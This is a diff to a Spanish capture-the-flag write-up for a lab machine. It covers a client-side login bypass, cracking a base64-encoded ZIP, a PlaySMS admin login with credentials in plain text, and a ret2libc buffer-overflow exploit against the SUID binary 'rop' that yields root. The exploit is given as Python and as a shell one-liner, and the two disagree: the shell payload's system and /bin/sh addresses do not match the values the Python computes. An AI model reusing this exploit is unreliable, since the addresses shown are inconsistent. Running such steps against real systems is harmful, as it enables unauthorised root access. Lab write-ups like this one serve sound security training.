@@ -44,7 +44,7 @@ Rutas interesantes: `/admin/`, un directorio con nombre aleatorio (`/asdiSIAJJ0Q
 
 1. **`/admin/`**: el login valida las credenciales en JavaScript (`/js/login.js`); se lee la comprobación y se pasa de largo. La página de éxito enlaza al resto.
 2. **Fichero en base64**: el contenido de `/asdiSIAJJ0QWE9JAS` es base64; al decodificarlo sale un ZIP (`impossiblepassword.zip`) con un fichero de texto.
-3. **Contraseña del ZIP**: está en una página escrita en brainfuck (se decodifica con `dcode.fr` o un intérprete local). Resultado: `idkwhatispass`.
+3. **Contraseña del ZIP**: el ZIP se rompe aparte (texto `impossiblepassword` y `zip2john` con diccionario). La página en brainfuck del 9999 decodifica a **`idkwhatispass`**, que es la contraseña de PlaySMS, no la del ZIP.
 4. **`/dev/backup/`**: devuelve la cadena `/playsms`. Ahí está el panel de PlaySMS y `admin:idkwhatispass` funciona.
 
 ```bash
@@ -95,19 +95,23 @@ ldd /home/ayush/.binary/rop
 
 El offset hasta `EIP` es 52. Con `gdb`/`pattern_create` se localiza, y con `readelf -s /lib/i386-linux-gnu/libc.so.6 | grep -E ' system| exit'` más `strings -a -t x libc.so.6 | grep '/bin/sh'` se monta el ret2libc:
 
+ASLR desactivado fija la base de libc (en esta build, `0xb7e19000`), pero **las direcciones no se copian de otro writeup**: se recalculan con `readelf -s libc.so.6 | grep -E ' system| exit'` y `strings -a -t x libc.so.6 | grep '/bin/sh'`.
+
 ```python
 import struct
-libc = 0xb7e19000
-system = libc + 0x0003a940
+libc   = 0xb7e19000          # base de ESTA build (ldd)
+system = libc + 0x0003a940   # offset de system en ESTA libc
 exit_  = libc + 0x0002e9d0
 binsh  = libc + 0x00158e8b
 print("A"*52 + struct.pack("<I", system) + struct.pack("<I", exit_) + struct.pack("<I", binsh))
 ```
 
 ```bash
-./rop $(python2 -c 'print "A"*52 + "\xa0\x3d\xe5\xb7" + "\xd0\x79\xe4\xb7" + "\x8b\x8e\x95\xb7"')
+./rop "$(python2 -c 'print "A"*52 + "\xa0\x3d\xe5\xb7" + "\xd0\x79\xe4\xb7" + "\x8b\x8e\x95\xb7"')"
 # root@frolic
 ```
+
+Si los tres valores no salen del `libc` de la máquina, el exploit falla con `SIGSEGV` aunque el offset (52) sea correcto.
 
 ## Evidencia
 
